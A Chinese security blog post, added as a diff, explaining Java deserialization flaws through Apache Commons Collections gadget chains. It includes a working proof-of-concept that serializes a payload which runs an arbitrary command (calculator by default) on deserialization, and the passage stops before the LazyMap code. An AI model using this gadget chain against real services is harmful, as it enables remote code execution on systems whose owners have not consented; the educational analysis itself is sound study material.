@@ -1,0 +1,1002 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="反序列化,JAVA," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。">
+<meta name="keywords" content="反序列化,JAVA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA反序列化漏洞知识点整理">
+<meta property="og:url" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/index.html">
+<meta property="og:site_name" content="Ethan&#39; Blog">
+<meta property="og:description" content="jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/001.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/002.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/003.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/004.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/005.png">
+<meta property="og:updated_time" content="2017-08-31T01:14:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JAVA反序列化漏洞知识点整理">
+<meta name="twitter:description" content="jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。">
+<meta name="twitter:image" content="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/001.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/"/>
+
+
+
+
+
+  <title> JAVA反序列化漏洞知识点整理 | Ethan' Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ethan' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ethan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/15061633">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ethan' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                JAVA反序列化漏洞知识点整理
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-07T11:07:41+08:00">
+                2017-05-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。</p>
+<a id="more"></a>
+<h2 id="JAVA反序列化漏洞"><a href="#JAVA反序列化漏洞" class="headerlink" title="JAVA反序列化漏洞"></a>JAVA反序列化漏洞</h2><p>反序列化漏洞的本质是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码，而不可信的输入和未检测反序列化对象的安全性是导致反序列化漏洞的常见原因。Java序列化常应用于RMI(Java Remote Method Invocatio, 远程方法调用)， JMX(Java Management Extensions, Java管理扩展), JMS(Java Message Service, Java消息服务) 技术中。</p>
+<h2 id="利用Apache-Commons-Collections实现远程代码执行"><a href="#利用Apache-Commons-Collections实现远程代码执行" class="headerlink" title="利用Apache Commons Collections实现远程代码执行"></a>利用Apache Commons Collections实现远程代码执行</h2><p>Apache Commons Collections作为一种公用库，其中实现的一些类可以被反序列化用来实现任意代码执行。这里以以Apache Commons Collections 3.2.1为例，解释如何构造对象，能够让程序在反序列化，即调用readObject()时，就能直接实现任意代码执行。</p>
+<h3 id="利用反射机制执行任意代码"><a href="#利用反射机制执行任意代码" class="headerlink" title="利用反射机制执行任意代码"></a>利用反射机制执行任意代码</h3><p>国外研究人员发现<code>InvokerTransformer</code>类中的<code>transform()</code>方法允许通过反射, 执行参数对象的某个方法，并返回执行结果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.iMethodName = methodName;</div><div class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.iMethodName = methodName;</div><div class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</div><div class="line">        <span class="keyword">this</span>.iArgs = args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(input == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                Class cls = input.getClass();</div><div class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</div><div class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</div><div class="line">            &#125;</div></pre></td></tr></table></figure>
+<img src="/2017/05/07/JAVA反序列化漏洞知识点整理/001.png" alt="001.png" title="">
+<img src="/2017/05/07/JAVA反序列化漏洞知识点整理/002.png" alt="002.png" title="">
+<p>可以看到，通过<code>transform()</code>方法里的反射，成功调用了<code>StringBuffer</code>类的<code>append()</code>方法并返回结果。</p>
+<h3 id="调用transform-方法"><a href="#调用transform-方法" class="headerlink" title="调用transform()方法"></a>调用transform()方法</h3><p>接下来就是要找到某种类，会自动调用<code>InvokerTransformer</code>类中的<code>transform()</code>方法，构造代码执行。明显调用<code>transform()</code>方法有以下两个类:</p>
+<ul>
+<li>TransformedMap</li>
+<li>LazyMap</li>
+</ul>
+<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>Apache Commons Collections中实现<code>TransformedMap</code>类，用来对<code>Map</code>进行某种变换，只要调用其<code>decorate()</code>方法，传入key和value的变换对象<code>Transformer</code>，即可从任意<code>Map</code>对象生成相应的<code>TransformedMap</code>，<code>decorate()</code>方法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>方法用来将一个对象转换成另一个对象。如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public interface Transformer &#123;</div><div class="line">    public Object transform(Object input);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>而前面提到的<code>InvokerTransformer</code>类实现了<code>Transformer</code>接口，因此这里就找到了调用<code>InvokerTransformer</code>类<code>transform()</code>方法的途径。那么，现在需要知道的是触发<code>TransformedMap</code>类调用<code>Transformer</code>的条件是什么？</p>
+<p><a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html" target="_blank" rel="external">commons-collections 3.2.2</a>指出当执行<code>Map</code>类的<code>put()</code>方法或<code>MapEntry</code>类的<code>setValue()</code>方法会自动调用<code>Transformer</code>。另外多个<code>Transformer</code>还能串起来，形成<code>ChainedTransformer</code>。</p>
+<img src="/2017/05/07/JAVA反序列化漏洞知识点整理/003.png" alt="003.png" title="">
+<p>从图中可以看出调用<code>Map</code>类的<code>put()</code>方法会自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法。</p>
+<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code>实现了<code>Map</code>接口，其中的<code>get(Object)</code>方法调用了<code>transform()</code>方法，跟进函数进去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">    <span class="comment">// create value for key if key is not currently in the map</span></div><div class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</div><div class="line">        Object value = factory.transform(key);</div><div class="line">        map.put(key, value);</div><div class="line">        <span class="keyword">return</span> value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> map.get(key);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里可以看到，在调用<code>transform()</code>方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的<code>factory.transform()</code>进行处理，跟踪<code>facory</code>变量找到<code>decorate()</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里的<code>decorate()</code>方法会对<code>factory</code>进行初始化，同时实例化一个<code>LazyMap</code>，为了能成功调用<code>transform()</code>方法，找到了<code>LazyMap</code>，发现在<code>get()</code>方法中调用了<code>transform()</code>方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的<code>get(Object)</code>方法。</p>
+<h3 id="突破限制条件"><a href="#突破限制条件" class="headerlink" title="突破限制条件"></a>突破限制条件</h3><h4 id="TransformedMap-1"><a href="#TransformedMap-1" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>虽然找到了自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法的途径，但是需要满足其触发条件：执行<code>Map</code>类的<code>put()</code>方法或<code>MapEntry</code>类的<code>setValue()</code>方法。显然这种方式还不够优雅，最佳条件是反序列化(调用<code>readObject()</code>方法)时就自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法导致代码执行。</p>
+<p>java运行库中的<code>AnnotationInvocationHandler</code>类, 有一个成员变量<code>memberValues</code>是<code>Map</code>类型，而且<code>readObject()</code>方法中对<code>memberValues</code>的每一项调用了<code>setValue()</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</div><div class="line"></div><div class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</div><div class="line">        <span class="keyword">this</span>.type = type;</div><div class="line">        <span class="keyword">this</span>.memberValues = memberValues;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</div><div class="line">        s.defaultReadObject();</div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></div><div class="line"></div><div class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            annotationType = AnnotationType.getInstance(type);</div><div class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</div><div class="line">            <span class="comment">// Class is no longer an annotation type; all bets are off</span></div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</div><div class="line">            String name = memberValue.getKey();</div><div class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</div><div class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></div><div class="line">                Object value = memberValue.getValue();</div><div class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</div><div class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</div><div class="line">                    <span class="comment">// 此处触发一系列的Transformer</span></div><div class="line">                    memberValue.setValue(</div><div class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</div><div class="line">                            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</div><div class="line">                                annotationType.members().get(name)));</div></pre></td></tr></table></figure>
+<p>因此，我们只需要用前面构造的<code>Map</code>来构造<code>AnnotationInvocationHandler</code>，进行序列化，当触发<code>readObject()</code>反序列化的时候，就能实现命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> java.lang.annotation.Target;</div><div class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</div><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by js on 2017/5/6.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        <span class="comment">/*</span></div><div class="line"><span class="comment">         * Runtime.getRuntime().exec("open /Applications/Calculator.app");</span></div><div class="line"><span class="comment">         */</span></div><div class="line">        String command = (args.length != <span class="number">0</span>) ? args[<span class="number">0</span>] : <span class="string">"/bin/sh,-c,open /Applications/Calculator.app"</span>;</div><div class="line">        String[] execArgs = command.split(<span class="string">","</span>);</div><div class="line">        Transformer[] transforms = <span class="keyword">new</span> Transformer[] &#123;</div><div class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(</div><div class="line">                        <span class="string">"getMethod"</span>,</div><div class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</div><div class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</div><div class="line">                ),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(</div><div class="line">                        <span class="string">"invoke"</span>,</div><div class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</div><div class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</div><div class="line">                ),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(</div><div class="line">                        <span class="string">"exec"</span>,</div><div class="line">                        <span class="keyword">new</span> Class[] &#123;String[].class&#125;,</div><div class="line">                        <span class="keyword">new</span> Object[] &#123;execArgs&#125;</div><div class="line">                )</div><div class="line">        &#125;;</div><div class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line">        Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">        <span class="comment">// tempMap 不能为空</span></div><div class="line">        tempMap.put(<span class="string">"hack"</span>, <span class="string">"you"</span>);</div><div class="line">        Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</div><div class="line">        Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</div><div class="line">        ctor.setAccessible(<span class="keyword">true</span>);</div><div class="line">        Object instance = ctor.newInstance(Target.class, exMap);</div><div class="line"></div><div class="line">        File f = <span class="keyword">new</span> File(<span class="string">"payload1"</span>);</div><div class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</div><div class="line">        oos.writeObject(instance);</div><div class="line">        oos.flush();</div><div class="line">        oos.close();</div><div class="line"></div><div class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(f));</div><div class="line">        <span class="comment">// 触发代码执行</span></div><div class="line">        Object newObj = ois.readObject();</div><div class="line">        ois.close();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这段恶意代码本质上就是利用反射调用<code>Runtime()</code> 执行了一段系统命令，作用等同于:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime) Runtime.class.getMethod(<span class="string">"getRuntime"</span>, <span class="keyword">null</span>).invoke(<span class="keyword">null</span>, <span class="keyword">null</span>)).exec(<span class="string">"/bin/sh -c open /Applications/Calculator.app"</span>)</div></pre></td></tr></table></figure>
+<p>当然，反序列化时自动执行任意代码还有其他方式，具体可以分析ysoserial源码，这里就不一一叙述。采用<code>AnnotationInvocationHandler</code>类也是有条件限制的，是否能成功利用与JDK的版本有关, <a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d" target="_blank" rel="external">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a>。</p>
+<img src="/2017/05/07/JAVA反序列化漏洞知识点整理/004.png" alt="004.png" title="">
+<p><code>AnnotationInvocationHandler</code>类移除了对<code>memberValue.setValue()</code>的调用，因此也就不能用<code>AnnotationInvocationHandler</code>+<code>TransformedMap</code>来构造POP链了。</p>
+<h4 id="LazyMap-1"><a href="#LazyMap-1" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>AnnotationInvocationHandler</code>构造函数初始化l<code>LazyMap</code>对象, 只需要找到一个<code>memberValues.get(Object)</code>的方法即可触发该漏洞，可惜的是<code>readObject()</code>方法里面并没有这个方法. 在<code>invoke()</code>方法中<code>memberValues.get(Object)</code>被调用了，如下:</p>
+<img src="/2017/05/07/JAVA反序列化漏洞知识点整理/005.png" alt="005.png" title="">
+<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口，所以它可以代理其他对象。这里利用这个特点，代理一个<code>Map</code>对象，得到<code>mapProxy</code>代理对象。然后，将<code>mapProxy</code>赋值到<code>AnnotationInvocationHandler</code>类中，当其调用<code>mapProxy</code>方法时，便可以触发<code>invoke()</code>方法。然后，便可以执行<code>transform</code>链。</p>
+<p>核心代码如下：</p>
